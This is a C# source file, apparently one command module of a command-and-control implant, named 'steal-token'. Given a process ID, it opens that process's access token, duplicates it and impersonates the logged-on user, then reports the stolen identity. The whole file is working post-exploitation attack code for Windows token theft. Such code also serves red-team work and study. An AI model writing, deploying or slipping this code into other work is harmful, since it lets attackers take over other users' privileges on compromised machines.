using Agent.Models;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;

namespace Agent.Commands
{
    public class StealToken : AgentCommand
    {
        public override string Name => "steal-token";

        public override string Execute(AgentTask task)
        {
            if (!int.TryParse(task.Arguments[0], out var pid))
            {
                return "Failed to parse PID";
            }

            var process = Process.GetProcessById(pid);

            var hToken = IntPtr.Zero;
            var hTokenCopy = IntPtr.Zero;
            var sa = new Native.Advapi32.SECURITY_ATTRIBUTES();
            try
            {
                // open handle to token
                if (!Native.Advapi32.OpenProcessToken(process.Handle, Native.Advapi32.DesiredAccess.TOKEN_ALL_ACCESS, out hToken))
                {
                    return "Failed to open process token";
                }
                // duplicate token
                if (!Native.Advapi32.DuplicateTokenEx(hToken, Native.Advapi32.TokenAccess.TOKEN_ALL_ACCESS, ref sa,
                     Native.Advapi32.SecurityImpersonationLevel.SECURITY_IMPERSONATION,
                     Native.Advapi32.TokenType.TOKEN_IMPERSONATION, out hTokenCopy))
                {
                    return "Failed to duplicate token";
                }
                // impersonate token
                if (Native.Advapi32.ImpersonateLoggedOnUser(hTokenCopy))
                {
                    var identity = new WindowsIdentity(hTokenCopy);
                    return $"Successfully impersonated {identity.Name}";
                }

                return "Failed to impersonate token";
            }
            catch
            {

            }
            finally
            {
                //close token handles
                if (hToken != IntPtr.Zero) Native.Kernel32.CloseHandle(hToken);
                if (hTokenCopy != IntPtr.Zero) Native.Kernel32.CloseHandle(hTokenCopy);
                
                process.Dispose();
            }

            return "Unknown error";
 
        }
    }
}
